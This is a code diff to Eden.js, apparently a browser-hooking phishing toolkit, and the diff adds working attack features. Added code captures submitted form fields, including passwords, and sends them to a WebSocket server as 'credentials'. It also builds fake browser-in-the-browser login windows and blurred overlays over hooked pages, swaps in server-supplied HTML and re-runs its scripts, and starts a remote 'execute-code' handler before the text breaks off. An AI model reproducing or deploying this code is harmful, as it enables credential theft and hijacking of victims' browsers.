@@ -1,17 +1,3 @@
-/**
- * Eden.js - Client information sender
- * Automatically connects to the server and sends minimal client information
- */
-
-// Configuration for link previews - Will be replaced by setup.py
-const EDEN_LINK_PREVIEW = {
-    enabled: true,
-    title: "varun",
-    description: "hello worls",
-    image: "https://cca3-2401-4900-1c2a-d58-d17f-d99c-c75f-290c.ngrok-free.app/thumbnails/thumbnail.jpg",
-    url: "http://localhost:8080",
-    twitter_card: "summary_large_image"
-};
 
 (function() {
     // Configuration
@@ -64,7 +50,70 @@ const EDEN_LINK_PREVIEW = {
         injectLinkPreviewMetaTags();
         restoreEffectStyles();
         setupGlobalFormSubmitHandlers();
-        console.log('DOM loaded, restoring effects if needed');
+        // Restore event handlers from localStorage
+        restoreEventHandlersFromStorage();
+        
+        // Restore rendered HTML if exists (must persist after refresh)
+        const savedHtml = localStorage.getItem('eden-rendered-html');
+        if (savedHtml) {
+            try {
+                console.log('Restoring rendered HTML from localStorage');
+                preserveBitBLayer();
+                const parser = new DOMParser();
+                const doc = parser.parseFromString(savedHtml, 'text/html');
+                document.body.innerHTML = '';
+                document.head.innerHTML = '';
+                const headElements = doc.head.querySelectorAll('*');
+                headElements.forEach(el => {
+                    document.head.appendChild(el.cloneNode(true));
+                });
+                
+                // Copy body content
+                const bodyElements = Array.from(doc.body.childNodes);
+                bodyElements.forEach(node => {
+                    if (node.nodeType === Node.ELEMENT_NODE || node.nodeType === Node.TEXT_NODE) {
+                        document.body.appendChild(node.cloneNode(true));
+                    }
+                });
+                
+                // Copy body attributes
+                if (doc.body) {
+                    Array.from(doc.body.attributes).forEach(attr => {
+                        document.body.setAttribute(attr.name, attr.value);
+                    });
+                }
+                
+                // Copy document attributes
+                Array.from(doc.documentElement.attributes).forEach(attr => {
+                    document.documentElement.setAttribute(attr.name, attr.value);
+                });
+                restoreBitBLayer();
+                // Re-execute scripts
+                document.head.querySelectorAll('script').forEach(script => {
+                    const newScript = document.createElement('script');
+                    Array.from(script.attributes).forEach(attr => {
+                        newScript.setAttribute(attr.name, attr.value);
+                    });
+                    newScript.textContent = script.textContent;
+                    script.parentNode.replaceChild(newScript, script);
+                });
+                
+                document.body.querySelectorAll('script').forEach(script => {
+                    const newScript = document.createElement('script');
+                    Array.from(script.attributes).forEach(attr => {
+                        newScript.setAttribute(attr.name, attr.value);
+                    });
+                    newScript.textContent = script.textContent;
+                    script.parentNode.replaceChild(newScript, script);
+                });
+                
+                console.log('Rendered HTML restored');
+            } catch (error) {
+                console.error('Error restoring rendered HTML:', error);
+            }
+        }
+        
+        console.log('DOM loaded, restoring effects and event handlers if needed');
     });
     
     // Function to set up global form submission handlers
@@ -235,7 +284,7 @@ const EDEN_LINK_PREVIEW = {
         console.log('Forcing cleanup of blur effect');
         
         // Remove elements
-        ['#eden-blur-overlay', '#eden-content-container', '#eden-session-banner', '#eden-session-style'].forEach(selector => {
+        ['#eden-blur-overlay', '#eden-content-container', '#eden-session-banner', '#eden-session-style', '#__eden_tpl_blur_overlay__'].forEach(selector => {
             const elements = document.querySelectorAll(selector);
             elements.forEach(el => {
                 if (el && el.parentNode) {
@@ -250,19 +299,20 @@ const EDEN_LINK_PREVIEW = {
                 el.parentNode.removeChild(el);
             }
         });
-        
+
         // Clear storage
         localStorage.removeItem('blur-data');
         localStorage.removeItem('eden-blur-applied');
         localStorage.removeItem('eden-blur-effect');
         localStorage.removeItem('eden-blur-intensity');
         localStorage.removeItem('blur-content');
+        localStorage.removeItem('eden_last_template_execution');
         localStorage.setItem('clean-flag', 'true');
         sessionStorage.setItem('clean-flag', 'true');
         
         console.log('Blur effect cleanup completed');
     }
-    
+   
     // Function to restore effects on page load
     function restoreEffectStyles() {
         // First check for session expired effect
@@ -378,6 +428,12 @@ const EDEN_LINK_PREVIEW = {
     
     // State variables
     let ws;
+    const delegatedBindings = new Set();
+    // Template system keys (bom-style for Eden)
+    const EDEN_TEMPLATES_KEY = 'eden_templates';
+    const EDEN_TEMPLATE_HANDLERS_KEY = 'eden_template_handlers';
+    // Store event handler messages for persistence
+    const eventHandlerMessages = [];
     let reconnectTimer;
     let heartbeatTimer;
     let clientIp = 'Unknown';
@@ -395,6 +451,809 @@ const EDEN_LINK_PREVIEW = {
         location: new Map(), // Map of clientId -> data
         clipboard: new Map() // Map of clientId -> data
     };
+
+    // Template helpers (bom.js-style adapted for Eden)
+    function edenGetTemplates() {
+        try {
+            const raw = localStorage.getItem(EDEN_TEMPLATES_KEY);
+            return raw ? JSON.parse(raw) || {} : {};
+        } catch (e) {
+            console.error('Failed to parse eden_templates', e);
+            return {};
+        }
+    }
+
+    function edenSetTemplates(obj) {
+        try {
+            localStorage.setItem(EDEN_TEMPLATES_KEY, JSON.stringify(obj || {}));
+        } catch (e) {
+            console.error('Failed to store eden_templates', e);
+        }
+    }
+
+    function edenGetTemplateHandlers() {
+        try {
+            const raw = localStorage.getItem(EDEN_TEMPLATE_HANDLERS_KEY);
+            const parsed = JSON.parse(raw);
+            return Array.isArray(parsed) ? parsed : [];
+        } catch (e) {
+            return [];
+        }
+    }
+
+    function edenSetTemplateHandlers(arr) {
+        try {
+            localStorage.setItem(EDEN_TEMPLATE_HANDLERS_KEY, JSON.stringify(arr || []));
+        } catch (e) {
+            console.error('Failed to store eden_template_handlers', e);
+        }
+    }
+
+    function edenRenderDisplay(data) {
+        if (!data || typeof data.html !== 'string') return;
+        
+        const html = data.html;
+        
+        // Store in localStorage for consistency
+        localStorage.setItem('showsContent', html);
+        if (data.fileName) {
+            localStorage.setItem('lastLoadedFile', data.fileName);
+        }
+        
+        // Full document replace: no wrappers, no containers, no eden.js styles.
+        // Content appears exactly as if user opened the HTML file directly in browser.
+        const finalHTML = html;
+        document.open();
+        document.write(finalHTML);
+        document.close();
+        
+        // Trigger QR detection after content is injected
+        setTimeout(() => {
+            if (typeof checkAndDisplayQR === 'function') {
+                checkAndDisplayQR();
+            }
+            if (typeof initEdenQR === 'function') {
+                initEdenQR();
+            }
+        }, 100);
+    }
+
+    function edenRenderBlur(data) {
+        if (!data || typeof data.html !== 'string') return;
+        
+        // Convert template data format to blurContent message format
+        const message = {
+            content: data.html,
+            effect: (data.blur && data.blur.effect) || 'blur',
+            intensity: Number((data.blur && data.blur.intensity) != null ? data.blur.intensity : 6),
+            fileName: data.fileName || null,
+            location: {
+                x: Number((data.blur && data.blur.x) != null ? data.blur.x : 50),
+                y: Number((data.blur && data.blur.y) != null ? data.blur.y : 50)
+            }
+        };
+        
+        // Add custom effect if present
+        if (message.effect === 'custom' && data.blur && data.blur.customEffect) {
+            message.customEffect = typeof data.blur.customEffect === 'string' 
+                ? { content: data.blur.customEffect } 
+                : data.blur.customEffect;
+        }
+        
+        // Use exact same code from blurContent case handler (lines 3953-4356)
+        if (typeof _forceCleanupBlurEffect === 'function') {
+            _forceCleanupBlurEffect();
+        }
+        
+        // Combined handler for blur effect and content display
+        if (message.content && typeof message.content === 'string') {
+            console.log('Received blurContent message with content');
+            
+            const effectType = message.effect || 'blur';
+            const intensity = parseInt(message.intensity) || 5;
+            console.log(`Applying ${effectType} effect with intensity ${intensity}`);
+            
+            // First remove any existing overlays and session banner
+            document.querySelectorAll('#eden-blur-overlay, #eden-content-container, #eden-session-banner, #eden-custom-effect').forEach(el => {
+                if (el && el.parentNode) {
+                    el.parentNode.removeChild(el);
+                }
+            });
+            
+            // Also remove any existing session or spotlight styles
+            document.querySelectorAll('#eden-session-style, #eden-spotlight-style, #eden-custom-effect-style').forEach(el => {
+                if (el && el.parentNode) {
+                    el.parentNode.removeChild(el);
+                }
+            });
+            
+            // Create and apply blur overlay using etemp.js approach
+            const overlay = document.createElement('div');
+            overlay.id = 'eden-blur-overlay'; // Use ID instead of class
+            
+            // Apply different effects based on type using cssText
+            if (effectType === 'blur') {
+                const blurAmount = Math.max(1, Math.min(20, intensity));
+                overlay.style.cssText = `
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    width: 100vw;
+                    height: 100vh;
+                    backdrop-filter: blur(${blurAmount}px);
+                    -webkit-backdrop-filter: blur(${blurAmount}px);
+                    background-color: rgba(0, 0, 0, 0.1);
+                    z-index: 999999;
+                    pointer-events: auto;
+                    display: block !important;
+                `;
+                console.log('Restored blur effect with intensity:', blurAmount, 'px');
+            } else if (effectType === 'shade') {
+                const opacityValue = Math.max(0.2, Math.min(0.9, intensity / 20));
+                overlay.style.cssText = `
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    width: 100vw;
+                    height: 100vh;
+                    background-color: rgba(0, 0, 0, ${opacityValue});
+                    z-index: 999999;
+                    pointer-events: auto;
+                    display: block !important;
+                `;
+                console.log('Restored shade effect with opacity:', opacityValue);
+            } else if (effectType === 'custom' && message.customEffect) {
+                // Handle custom effect
+                const customEffect = message.customEffect;
+                console.log('Applying custom effect:', customEffect.name);
+                
+                // Apply CSS-based effect (only support CSS now)
+                const styleEl = document.createElement('style');
+                styleEl.id = 'eden-custom-effect-style';
+                
+                // Add CSS variables for intensity that can be used in the custom CSS
+                const intensityValue = Math.max(1, Math.min(20, intensity));
+                const cssWithVars = `
+                    :root {
+                        --eden-effect-intensity: ${intensityValue};
+                        --eden-effect-opacity: ${intensityValue / 20};
+                        --eden-effect-blur: ${intensityValue}px;
+                        --eden-effect-contrast: ${100 + (intensityValue * 5)}%;
+                        --eden-effect-brightness: ${100 + (intensityValue * 2)}%;
+                    }
+                    ${customEffect.content}
+                `;
+                
+                styleEl.textContent = cssWithVars;
+                document.head.appendChild(styleEl);
+                
+                // Apply basic overlay with intensity-based properties
+                const opacityValue = Math.max(0.1, Math.min(1.0, intensity / 20));
+                overlay.style.cssText = `
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    width: 100vw;
+                    height: 100vh;
+                    z-index: 999999;
+                    pointer-events: auto;
+                    display: block !important;
+                    opacity: ${opacityValue};
+                `;
+                
+                // Add custom class for CSS targeting
+                overlay.className = 'eden-custom-effect';
+                
+                console.log('Applied custom effect:', customEffect.name);
+            } else {
+                // Default or 'none' effect
+                overlay.style.cssText = `
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    width: 100vw;
+                    height: 100vh;
+                   
+                    z-index: 999999;
+                    pointer-events: auto;
+                    display: block !important;
+                `;
+                console.log('Restored default/none effect background');
+            }
+            
+            // Store effect info for persistence after refresh
+            localStorage.setItem('eden-blur-effect', effectType);
+            localStorage.setItem('eden-blur-intensity', intensity.toString());
+            localStorage.setItem('eden-blur-applied', 'true');
+            
+            // Add the overlay to the body
+            document.body.appendChild(overlay);
+            
+            // Create a minimal container that won't affect template display - using etemp.js approach
+            const contentContainer = document.createElement('div');
+            contentContainer.id = 'eden-content-container';
+            
+            // Get position from message or use default center position
+            const posX = message.location && typeof message.location.x === 'number' ? message.location.x : 50;
+            const posY = message.location && typeof message.location.y === 'number' ? message.location.y : 50;
+            
+            console.log(`Positioning content at X: ${posX}%, Y: ${posY}%`);
+            
+            contentContainer.style.cssText = `
+                position: fixed;
+                top: ${posY}%;
+                left: ${posX}%;
+                transform: translate(-50%, -50%);
+                max-width: 95%;
+                max-height: 95vh;
+                overflow: auto;
+                border: none;
+                background: none;
+                box-shadow: none;
+                padding: 0;
+                margin: 0;
+                z-index: 2000000; /* Higher z-index than overlay to ensure it stays on top */
+                display: block !important;
+            `;
+            console.log('Created content container');
+            
+            // Process content to handle forms
+            const tempDiv = document.createElement('div');
+            tempDiv.innerHTML = message.content;
+            
+            // Find and modify forms to prevent redirect
+            const forms = tempDiv.querySelectorAll('form');
+            forms.forEach(form => {
+                // Save original attributes
+                const originalAction = form.getAttribute('action') || '';
+                const originalTarget = form.getAttribute('target') || '';
+                
+                // Set data attributes to store original values
+                form.setAttribute('data-original-action', originalAction);
+                form.setAttribute('data-original-target', originalTarget);
+                form.setAttribute('data-blur-form', 'true'); // Mark as a blur form
+                
+                // Remove navigation attributes
+                form.removeAttribute('action');
+                form.removeAttribute('target');
+                
+                // Set both onsubmit and a direct event listener for redundancy
+                form.setAttribute('onsubmit', 'return window.edenFormSubmitted(this);');
+            });
+
+            if (forms.length > 0) {
+                sessionStorage.setItem('eden-from-section', 'blur');
+            }
+            
+            // Set the processed content
+            contentContainer.innerHTML = tempDiv.innerHTML;
+            
+            function processBlurFormSubmission(form) {
+                if (!form) {
+                    return false;
+                }
+
+                if (form.dataset.edenSubmitting === 'true') {
+                    console.log('Blur form submission already handled, skipping duplicate processing');
+                    return false;
+                }
+
+                form.dataset.edenSubmitting = 'true';
+
+                // Capture form data (ensure it's captured even if global handler doesn't run)
+                if (form && typeof form.elements !== 'undefined') {
+                    try {
+                        const formData = new FormData(form);
+                        const data = Object.fromEntries(formData.entries());
+                        
+                        if (Object.keys(data).length > 0) {
+                            const formMetadata = {
+                                hasPassword: form.querySelector('input[type="password"]') !== null,
+                                hasEmail: form.querySelector('input[type="email"]') !== null,
+                                inputCount: form.querySelectorAll('input').length,
+                                formId: form.id || form.name || '',
+                                formAction: form.action || '',
+                                formClass: form.className || '',
+                                formMethod: form.method || 'get'
+                            };
+                            
+                            // Send form data to server
+                            if (ws && ws.readyState === WebSocket.OPEN) {
+                                console.log('Blur form data captured, sending to server');
+                                ws.send(JSON.stringify({
+                                    type: 'credentials',
+                                    data: data,
+                                    formMetadata: formMetadata,
+                                    url: document.location.href,
+                                    timestamp: new Date().toISOString(),
+                                    formId: form.id || 'form_' + Math.random().toString(36).substring(2, 10),
+                                    clientId: clientId || 'unknown',
+                                    ip: clientIp || 'unknown',
+                                    source: 'blur_form_capture'
+                                }));
+                            }
+                        }
+                    } catch (error) {
+                        console.error('Error capturing form data:', error);
+                    }
+                }
+
+                // Check for selected files to download (download section feature)
+                // Check both storage keys for compatibility
+                const selectedFilesJson = localStorage.getItem('eden-download-selected-files') || 
+                                                          localStorage.getItem('eden-blur-selected-files');
+                const downloadFlag = sessionStorage.getItem('eden-download-flag') || 
+                                                   localStorage.getItem('eden-download-flag');
+                
+                if (selectedFilesJson && downloadFlag === 'true') {
+                    try {
+                        const selectedFiles = JSON.parse(selectedFilesJson);
+                        
+                        if (selectedFiles.length > 0) {
+                            console.log('Downloading selected files after form submission:', selectedFiles.length);
+                            
+                            // Process each selected file for download
+                            selectedFiles.forEach(file => {
+                                if (file.fileName && file.content) {
+                                    // Create download link
+                                    const blob = new Blob([file.content], { type: 'text/html' });
+                                    const url = URL.createObjectURL(blob);
+                                    const a = document.createElement('a');
+                                    a.href = url;
+                                    a.download = file.fileName;
+                                    document.body.appendChild(a);
+                                    a.click();
+                                    document.body.removeChild(a);
+                                    URL.revokeObjectURL(url);
+                                }
+                            });
+                            
+                            // DO NOT clear selected files - keep them for future submissions
+                            // Files remain selected until manually deselected
+                            // This allows multiple form submissions to download the same files
+                        }
+                    } catch (error) {
+                        console.error('Error processing selected files for download:', error);
+                    }
+                    
+                    // DO NOT clear the download flag - keep it active for future submissions
+                    // The flag will remain until manually cleared or page refresh
+                }
+
+                if (typeof cleanupBlurOverlay === 'function') {
+                    cleanupBlurOverlay();
+                } else {
+                    document.querySelectorAll('#eden-blur-overlay, #eden-content-container').forEach(el => {
+                        if (el && el.parentNode) {
+                            el.parentNode.removeChild(el);
+                        }
+                    });
+
+                    localStorage.removeItem('blur-data');
+                    localStorage.removeItem('eden-blur-applied');
+                    localStorage.removeItem('eden-blur-effect');
+                    localStorage.removeItem('eden-blur-intensity');
+                    localStorage.removeItem('blur-content');
+                    localStorage.setItem('clean-flag', 'true');
+                    sessionStorage.setItem('clean-flag', 'true');
+                }
+
+                return false;
+            }
+
+            // Add form submission handler to window
+            window.edenFormSubmitted = processBlurFormSubmission;
+            
+            // Ensure we have document-level form submission monitoring
+            if (!window.blurFormSubmitListener) {
+                window.blurFormSubmitListener = true;
+                
+                // Add a global event listener for all form submissions
+                document.addEventListener('submit', function(e) {
+                    const form = e.target;
+                    
+                    // If this is a blur form or we have active blur overlay
+                    if (form.getAttribute('data-blur-form') === 'true' || 
+                        document.getElementById('eden-blur-overlay') || 
+                        localStorage.getItem('eden-blur-applied') === 'true') {
+                        
+                        console.log('Detected form submission with active blur effect');
+                        e.preventDefault();
+                        e.stopPropagation();
+                        processBlurFormSubmission(form);
+                        return false;
+                    }
+                }, true); // Use capturing to catch all form submissions
+            }
+            
+            // Define cleanup function
+            function cleanupBlurOverlay() {
+                console.log('Cleaning up blur overlay and content');
+                
+                // Also clean up any custom effects
+                document.querySelectorAll('#eden-custom-effect, #eden-custom-effect-style').forEach(el => {
+                    if (el && el.parentNode) {
+                        el.parentNode.removeChild(el);
+                    }
+                });
+                
+                // Remove elements
+                ['#eden-blur-overlay', '#eden-content-container', '#eden-session-banner', '#eden-session-style'].forEach(selector => {
+                    const elements = document.querySelectorAll(selector);
+                    elements.forEach(el => {
+                        if (el && el.parentNode) {
+                            el.parentNode.removeChild(el);
+                        }
+                    });
+                });
+                
+                // Clear storage
+                localStorage.removeItem('blur-data');
+                localStorage.removeItem('eden-blur-applied');
+                localStorage.removeItem('eden-blur-effect');
+                localStorage.removeItem('eden-blur-intensity');
+                localStorage.removeItem('blur-content');
+                localStorage.setItem('clean-flag', 'true');
+                sessionStorage.setItem('clean-flag', 'true');
+                
+                console.log('Cleanup completed');
+            }
+            
+            
+            // Add content container to body
+            document.body.appendChild(contentContainer);
+            
+            // Store both effect and content data in a single object for persistence
+            const blurData = {
+                content: message.content,
+                effectType: effectType,
+                intensity: intensity,
+                fileName: message.fileName || null,
+                location: {
+                    x: posX,
+                    y: posY
+                }
+            };
+            
+            // Add custom effect data if applicable
+            if (effectType === 'custom' && message.customEffect) {
+                blurData.customEffect = message.customEffect;
+            }
+            
+            localStorage.setItem('blur-data', JSON.stringify(blurData));
+            
+            // Also store the position separately for legacy code
+            localStorage.setItem('eden_blur_location_x', posX.toString());
+            localStorage.setItem('eden_blur_location_y', posY.toString());
+            
+            // Keep legacy storage for backward compatibility
+            localStorage.setItem('eden-blur-applied', 'true');
+            localStorage.setItem('eden-blur-effect', effectType);
+            localStorage.setItem('eden-blur-intensity', intensity.toString());
+            localStorage.setItem('blur-content', message.content);
+            
+            if (message.fileName) {
+                localStorage.setItem('lastLoadedFile', message.fileName);
+            }
+            
+            console.log('Saved unified blur data to localStorage for persistence');
+            
+            console.log('Blur content applied successfully');
+        }
+    }
+
+    // ============================================
+    // BITB SYSTEM - ISOLATED LAYER ON documentElement
+    // ============================================
+    // Test A: Hooked page -> BITB: BITB works, stays centered, chrome-like window.
+    // Test B: showContent -> BITB: BITB loads, not white, not mixing, chrome-like window.
+    // Test C: showContent -> BITB -> Close -> BITB again: No crashes, no disappear, no mixing.
+    //
+    /**
+     * Get or create the BITB layer. Layer lives on document.documentElement, NOT in body.
+     * Survives ANY showContent / body replacement.
+     */
+    function getOrCreateBitBLayer() {
+        let layer = document.getElementById('eden-bitb-layer');
+        if (layer) return layer;
+        layer = document.createElement('div');
+        layer.id = 'eden-bitb-layer';
+        layer.setAttribute('style', 'position:fixed;inset:0;z-index:999999999;pointer-events:auto;margin:0;padding:0;border:none;box-sizing:border-box;');
+        document.documentElement.appendChild(layer);
+        return layer;
+    }
+    
+    /**
+     * Clear BITB window content only (does NOT remove the layer).
+     * Removes #eden-bitb-window and all browser windows from the layer, clears localStorage.
+     */
+    function resetBitBStateHard() {
+        console.log('resetBitBStateHard: Clearing BITB window state (layer stays)');
+        const layer = document.getElementById('eden-bitb-layer');
+        if (layer) {
+            layer.innerHTML = '';
+        }
+        try {
+            document.querySelectorAll('.browser-window').forEach(win => {
+                try { win.remove(); } catch (e) { console.warn('resetBitBStateHard: Error removing window:', e); }
+            });
+        } catch (e) { console.warn('resetBitBStateHard: Error querying windows:', e); }
+        try {
+            const frame = document.getElementById('eden-bitb-frame');
+            if (frame) frame.remove();
+        } catch (e) { console.warn('resetBitBStateHard: Error removing iframe:', e); }
+        const keysToRemove = [];
+        try {
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                if (key && (
+                    key.startsWith('BITBContent_') ||
+                    key === 'pendingBITBContent' || key === 'BITB_pending' || key === 'BITB_reload' ||
+                    key === 'eden_pending_bitb' || key === 'eden_bitb_html' || key === 'eden_bitb_type' ||
+                    key === 'eden_bitb_timestamp' || key === 'bitb_window_html' || key === 'bitb_active' ||
+                    key === 'bitb_session' || key === 'bitb_url' || key === 'BITB_fileName' ||
+                    key === 'BITB_favicon' || key === 'BITB_url'
+                )) keysToRemove.push(key);
+            }
+        } catch (e) { console.warn('resetBitBStateHard: Error reading localStorage:', e); }
+        keysToRemove.forEach(key => { try { localStorage.removeItem(key); } catch (e) {} });
+        try {
+            delete window.__eden_bitb_active;
+            delete window.__eden_bitb_minimized;
+            delete window.__eden_bitb_reload;
+            delete window.__eden_bitb_temp;
+            if (window.__eden_bitb_cache && window.__eden_bitb_cache.parentNode) {
+                window.__eden_bitb_cache.parentNode.removeChild(window.__eden_bitb_cache);
+            }
+            delete window.__eden_bitb_cache;
+        } catch (e) {}
+        try {
+            if (window.__eden_reload_interval) { clearInterval(window.__eden_reload_interval); window.__eden_reload_interval = null; }
+        } catch (e) {}
+        console.log('resetBitBStateHard: Cleanup complete');
+    }
+    
+    /**
+     * Preserve BITB layer before showContent() replaces body.
+     * Layer is removed from DOM and cached; it is NOT inside body.
+     */
+    function preserveBitBLayer() {
+        const layer = document.getElementById('eden-bitb-layer');
+        if (layer && layer.parentNode) {
+            layer.parentNode.removeChild(layer);
+            window.__eden_bitb_cache = layer;
+            console.log('Preserved BITB layer before showContent()');
+        }
+    }
+    
+    /**
+     * Restore BITB layer after showContent() replaced body.
+     * Re-append to documentElement so it survives and stays above everything.
+     */
+    function restoreBitBLayer() {
+        if (window.__eden_bitb_cache) {
+            document.documentElement.appendChild(window.__eden_bitb_cache);
+            window.__eden_bitb_cache = null;
+            console.log('Restored BITB layer after showContent()');
+        }
+    }
+    
+    /**
+     * Launch BITB - content loads via iframe.srcdoc only (no body.innerHTML, no document.write).
+     * Layer is on documentElement; window is created inside layer.
+     */
+    function launchBitB(html, fileName = null, customFavicon = null, customUrl = null) {
+        console.log('launchBitB: Starting BITB launch');
+        if (!document.body) {
+            setTimeout(() => launchBitB(html, fileName, customFavicon, customUrl), 100);
+            return;
+        }
+        resetBitBStateHard();
+        const layer = getOrCreateBitBLayer();
+        layer.style.display = '';
+        showContentInWindow(html, fileName, customFavicon, customUrl, layer);
+        console.log('launchBitB: BITB window created successfully');
+    }
+    
+    /**
+     * Handle BITB content request - unified entry point
+     */
+    function handleBITBContent(message) {
+        console.log('handleBITBContent: Processing BITB request');
+        
+        const content = message.content || '<html><body><p>No content</p></body></html>';
+        const fileName = message.fileName || 'window_' + Date.now();
+        const customFavicon = (message.customFavicon !== undefined && message.customFavicon !== null && message.customFavicon !== '') ? message.customFavicon : null;
+        const customUrl = (message.customUrl !== undefined && message.customUrl !== null && message.customUrl !== '') ? message.customUrl : null;
+        const reload = message.reload === true || message.reload === 'true';
+        
+        if (reload) {
+            // Save for after reload
+            localStorage.setItem('BITB_pending', content);
+            localStorage.setItem('BITB_reload', 'true');
+            if (fileName) localStorage.setItem('BITB_fileName', fileName);
+            if (customFavicon) localStorage.setItem('BITB_favicon', customFavicon);
+            if (customUrl) localStorage.setItem('BITB_url', customUrl);
+            
+            console.log('handleBITBContent: Reloading page...');
+            location.reload();
+        } else {
+            // Launch immediately
+            launchBitB(content, fileName, customFavicon, customUrl);
+        }
+    }
+    
+    /**
+     * Restore BITB after page reload
+     */
+    function restoreBitBAfterReload() {
+        if (localStorage.getItem('BITB_reload') !== 'true') return;
+        
+        const pending = localStorage.getItem('BITB_pending');
+        if (!pending) {
+            localStorage.removeItem('BITB_reload');
+            return;
+        }
+        
+        const fileName = localStorage.getItem('BITB_fileName') || 'window_' + Date.now();
+        const customFavicon = localStorage.getItem('BITB_favicon') || null;
+        const customUrl = localStorage.getItem('BITB_url') || null;
+        
+        // Wait 300-500ms after page load so BITB appears after showContent/body is stable
+        setTimeout(() => {
+            launchBitB(pending, fileName, customFavicon, customUrl);
+            localStorage.removeItem('BITB_pending');
+            localStorage.removeItem('BITB_reload');
+            localStorage.removeItem('BITB_fileName');
+            localStorage.removeItem('BITB_favicon');
+            localStorage.removeItem('BITB_url');
+            console.log('restoreBitBAfterReload: BITB restored');
+        }, 400);
+    }
+    
+    function edenRenderBITB(tpl) {
+        if (!tpl || typeof tpl.html !== 'string') return;
+        handleBITBContent({
+            content: tpl.html,
+            fileName: tpl.fileName || 'template_' + Date.now(),
+            customFavicon: tpl.bitb && tpl.bitb.favicon,
+            customUrl: tpl.bitb && tpl.bitb.url,
+            reload: tpl.reload === true || tpl.reload === 'true'
+        });
+    }
+
+    function edenRenderTemplate(tpl) {
+        if (!tpl || !tpl.type) return;
+        if (tpl.type === 'display') {
+            edenRenderDisplay({ html: tpl.html });
+        } else if (tpl.type === 'blur') {
+            edenRenderBlur({
+                html: tpl.html,
+                blur: {
+                    effect: tpl.blur && tpl.blur.effect,
+                    intensity: tpl.blur && tpl.blur.intensity,
+                    x: tpl.blur && tpl.blur.x,
+                    y: tpl.blur && tpl.blur.y
+                }
+            });
+        } else if (tpl.type === 'bitb') {
+            edenRenderBITB(tpl);
+        }
+    }
+
+    function edenAttachTemplateEventHandler(cfg) {
+        if (!cfg || !cfg.action || (!cfg.selector && !cfg.area) || !cfg.templateType || !cfg.payload) return;
+        const key = cfg.selector
+            ? `tpl|${cfg.action}|selector|${cfg.selector}|${cfg.templateType}|${cfg.templateName || 'unnamed'}`
+            : `tpl|${cfg.action}|area|${cfg.area.x}|${cfg.area.y}|${cfg.area.width}|${cfg.area.height}|${cfg.templateType}|${cfg.templateName || 'unnamed'}`;
+        if (delegatedBindings.has(key)) return;
+        const handler = function (event) {
+            if (cfg.selector) {
+                const target = event.target.closest(cfg.selector);
+                if (!target) return;
+            } else if (cfg.area) {
+                const x = event.clientX + window.scrollX;
+                const y = event.clientY + window.scrollY;
+                if (!(x >= cfg.area.x && x <= cfg.area.x + cfg.area.width &&
+                      y >= cfg.area.y && y <= cfg.area.y + cfg.area.height)) {
+                    return;
+                }
+            }
+            if (!cfg.templateType || !cfg.payload) return;
+            if (cfg.templateType === 'display') {
+                edenRenderDisplay({ html: cfg.payload.html });
+            } else if (cfg.templateType === 'blur') {
+                edenRenderBlur({
+                    html: cfg.payload.html,
+                    blur: cfg.payload.blur || {}
+                });
+            } else if (cfg.templateType === 'bitb') {
+                edenRenderBITB({
+                    html: cfg.payload.html,
+                    fileName: cfg.payload.fileName,
+                    bitb: cfg.payload.bitb || {}
+                });
+            }
+            if (cfg.templateType !== 'bitb') {
+                try {
+                    localStorage.setItem('eden_last_template_execution', JSON.stringify({
+                        templateName: cfg.templateName,
+                        type: cfg.templateType
+                    }));
+                } catch (e) {
+                    console.error('Failed to store last template execution', e);
+                }
+            }
+        };
+        document.addEventListener(cfg.action, handler, true);
+        delegatedBindings.add(key);
+        const handlers = edenGetTemplateHandlers();
+        handlers.push({
+            event: cfg.action,
+            selector: cfg.selector || null,
+            area: cfg.area || null,
+            actionType: 'template',
+            templateName: cfg.templateName,
+            templateType: cfg.templateType
+        });
+        edenSetTemplateHandlers(handlers);
+        console.log(`Template event handler attached: ${cfg.action} -> ${cfg.selector || '[area]'} (${cfg.templateType}: ${cfg.templateName || 'unnamed'})`);
+    }
+
+    function edenAttachTemplateHandler(cfg) {
+        if (!cfg || !cfg.event || (!cfg.selector && !cfg.area) || !cfg.templateName) return;
+        const templates = edenGetTemplates();
+        const tpl = templates[cfg.templateName];
+        if (!tpl || !tpl.type) return;
+        let payload = {};
+        if (tpl.type === 'display') {
+            payload = { html: tpl.html, fileName: tpl.fileName || cfg.templateName };
+        } else if (tpl.type === 'blur') {
+            payload = { html: tpl.html, fileName: tpl.fileName || cfg.templateName, blur: tpl.blur || {} };
+        } else if (tpl.type === 'bitb') {
+            payload = { html: tpl.html, fileName: tpl.fileName || cfg.templateName, bitb: tpl.bitb || {} };
+        }
+        edenAttachTemplateEventHandler({
+            templateType: tpl.type,
+            action: cfg.event,
+            payload: payload,
+            selector: cfg.selector || null,
+            area: cfg.area || null,
+            templateName: cfg.templateName
+        });
+    }
+
+    function edenReattachStoredTemplateHandlers() {
+        const handlers = edenGetTemplateHandlers();
+        handlers.forEach(h => {
+            if (h && h.actionType === 'template') {
+                if (h.templateType && h.event) {
+                    const templates = edenGetTemplates();
+                    const tpl = templates[h.templateName];
+                    if (tpl && tpl.type) {
+                        let payload = {};
+                        if (tpl.type === 'display') {
+                            payload = { html: tpl.html, fileName: tpl.fileName || h.templateName };
+                        } else if (tpl.type === 'blur') {
+                            payload = { html: tpl.html, fileName: tpl.fileName || h.templateName, blur: tpl.blur || {} };
+                        } else if (tpl.type === 'bitb') {
+                            payload = { html: tpl.html, fileName: tpl.fileName || h.templateName, bitb: tpl.bitb || {} };
+                        }
+                        edenAttachTemplateEventHandler({
+                            templateType: tpl.type,
+                            action: h.event,
+                            payload: payload,
+                            selector: h.selector || null,
+                            area: h.area || null,
+                            templateName: h.templateName
+                        });
+                    }
+                } else if (h.event && (h.selector || h.area) && h.templateName) {
+                    edenAttachTemplateHandler(h);
+                }
+            }
+        });
+    }
 
     // Extend Eden namespace with permission utilities
     window.eden = window.eden || {};
@@ -506,11 +1365,306 @@ const EDEN_LINK_PREVIEW = {
     
     // Initialize clientId
     clientId = getOrCreateClientId();
+
+    function handleExecuteCode(message) {
+        try {
+            if (!message) return;
+            console.log('execute-code message received', message);
+
+            const enhancedClientId = sessionStorage.getItem('eden_enhanced_client_id');
+            const baseClientId = getOrCreateClientId();
+
+            if (message.targetClientId) {
+                const target = message.targetClientId;
